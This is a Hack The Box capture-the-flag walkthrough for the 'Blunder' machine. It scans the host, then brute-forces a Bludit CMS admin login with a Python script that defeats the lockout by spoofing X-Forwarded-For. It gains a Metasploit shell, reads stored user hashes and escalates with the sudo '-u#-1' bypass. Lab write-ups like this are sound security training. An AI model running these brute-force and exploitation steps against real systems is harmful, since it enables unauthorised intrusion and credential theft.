# Walkthrough

* Check open ports with
  * `$ nmap -A -o nmap_escaneo.txt 10.10.10.191`

```
# Nmap 7.80 scan initiated Tue Oct 13 04:41:30 2020 as: nmap -A -o escaneo.txt 10.10.10.191
Nmap scan report for 10.10.10.191
Host is up (0.038s latency).
Not shown: 998 filtered ports
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Oct 13 04:41:43 2020 -- 1 IP address (1 host up) scanned in 13.08 seconds
```

* Check existing directories with
  * `./ffuf -c -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.191/FUZZ -e .txt,.html,.php -o ffuf_fuzzed.txt`

```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.191/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .txt .html .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

.php                    [Status: 403, Size: 277, Words: 20, Lines: 10]
.html                   [Status: 403, Size: 277, Words: 20, Lines: 10]
                        [Status: 200, Size: 7561, Words: 794, Lines: 171]
.hta.txt                [Status: 403, Size: 277, Words: 20, Lines: 10]
.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10]
.hta.html               [Status: 403, Size: 277, Words: 20, Lines: 10]
.hta.php                [Status: 403, Size: 277, Words: 20, Lines: 10]
.htpasswd.php           [Status: 403, Size: 277, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
.htaccess.php           [Status: 403, Size: 277, Words: 20, Lines: 10]
.htaccess.html          [Status: 403, Size: 277, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
.htpasswd.txt           [Status: 403, Size: 277, Words: 20, Lines: 10]
.htpasswd.html          [Status: 403, Size: 277, Words: 20, Lines: 10]
.htaccess.txt           [Status: 403, Size: 277, Words: 20, Lines: 10]
0                       [Status: 200, Size: 7561, Words: 794, Lines: 171]
about                   [Status: 200, Size: 3280, Words: 225, Lines: 106]
admin                   [Status: 301, Size: 0, Words: 1, Lines: 1]
cgi-bin/                [Status: 301, Size: 0, Words: 1, Lines: 1]
install.php             [Status: 200, Size: 30, Words: 5, Lines: 1]
LICENSE                 [Status: 200, Size: 1083, Words: 155, Lines: 22]
robots.txt              [Status: 200, Size: 22, Words: 3, Lines: 2]
robots.txt              [Status: 200, Size: 22, Words: 3, Lines: 2]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
todo.txt                [Status: 200, Size: 118, Words: 20, Lines: 5]
:: Progress: [18456/18456] :: Job [1/1] :: 128 req/sec :: Duration: [0:02:24] :: Errors: 0 ::
```

* Create our own wordlist for the fuzzer
  * `$ cewl 10.10.10.191 -w dict.txt`

* Download bruteforce tool for Blunder [here](https://rastating.github.io/bludit-brute-force-mitigation-bypass/) and name it fuzzer.py

* Change ip address, username and wordlist
```python3
#!/usr/bin/python3
import re
import requests

host = 'http://10.10.10.191'
login_url = host + '/admin/login'
username = 'fergus'
wordlist = []


file = open("wordlist.txt", "r").read().splitlines()

for password in file:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print('[*] Trying: {p}'.format(p = password))

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            break
```

* Execute the script
  * `$ python3 fuzzer.py`

```
            ...
SUCCESS: Password found!
Use fergus:RolandDeschain to login.
```

* Execute metasploit with fergus credentials

```
$ sudo msfconsole
msf > use exploit/linux/http/bludit_upload_images_exec
msf exploit(bludit_upload_images_exec) > show targets
    ...targets...
msf exploit(bludit_upload_images_exec) > set TARGET 0
msf exploit(bludit_upload_images_exec) > show options
    ...show and set options...
msf exploit(bludit_upload_images_exec) > exploit
```
```
meterpreter > shell
python -c 'import pty;pty.spawn("/bin/bash")'
$ cd /var/www/bludit-3.10.0a/bl-content/databases
$ cat users.php
```

* Own user
  * We collect the sha1 hash of the hugo user and we decrypt it, then:
```
$ su hugo
Password:
$ cat /home/hugo/user.txt
```


* Own root
```
$ sudo -l
$ sudo -u#-1 /bin/bash
$ cat /root/root.txt
```